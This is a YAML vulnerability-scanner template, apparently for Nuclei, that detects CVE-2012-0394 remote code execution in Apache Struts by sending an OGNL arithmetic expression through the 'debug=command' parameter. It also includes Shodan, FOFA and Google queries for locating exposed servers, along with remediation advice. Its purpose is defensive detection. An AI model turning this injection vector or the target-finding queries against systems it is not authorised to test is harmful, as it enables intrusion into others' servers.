http:
- matchers:
  - type: word
    words:
    - '{{result}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/portal/displayAPSForm.action?debug=command&expression={{first}}*{{second}}'
id: CVE-2012-0394
info:
  author: tess
  classification:
    cpe: cpe:2.3:a:apache:struts:*:*:*:*:*:*:*:*
    cve-id: CVE-2012-0394
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P
    cvss-score: 6.8
    cwe-id: CWE-94
    epss-percentile: 0.99743
    epss-score: 0.92749
  description: 'Apache Struts before 2.3.1.1 is susceptible to remote code execution.
    When developer mode is used in the DebuggingInterceptor component, a remote attacker
    can execute arbitrary OGNL commands via unspecified vectors, which can allow for
    execution of malware, obtaining sensitive information, modifying data, and/or
    gaining full control over a compromised system without entering necessary credentials..
    NOTE: the vendor characterizes this behavior as not "a security vulnerability
    itself."

    '
  impact: 'Successful exploitation of this vulnerability allows remote attackers to
    execute arbitrary code on the affected server.

    '
  metadata:
    fofa-query:
    - body="struts problem report"
    - title="struts2 showcase"
    - body="apache struts"
    google-query: intitle:"struts2 showcase"
    max-request: 1
    product: struts
    shodan-query:
    - html:"Struts Problem Report"
    - http.title:"struts2 showcase"
    - http.html:"struts problem report"
    - http.html:"apache struts"
    vendor: apache
    verified: true
  name: Apache Struts <2.3.1.1 - Remote Code Execution
  reference:
  - https://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/
  - https://www.exploit-db.com/exploits/31434
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0394
  - http://www.exploit-db.com/exploits/18329
  - https://nvd.nist.gov/vuln/detail/CVE-2012-0394
  remediation: 'Upgrade Apache Struts to a version higher than 2.3.1.1 or apply the
    necessary patches.

    '
  severity: medium
  tags: cve,cve2012,ognl,injection,edb,apache,struts,vuln
variables:
  first: '{{rand_int(1000, 9999)}}'
  result: '{{to_number(first)*to_number(second)}}'
  second: '{{rand_int(1000, 9999)}}'
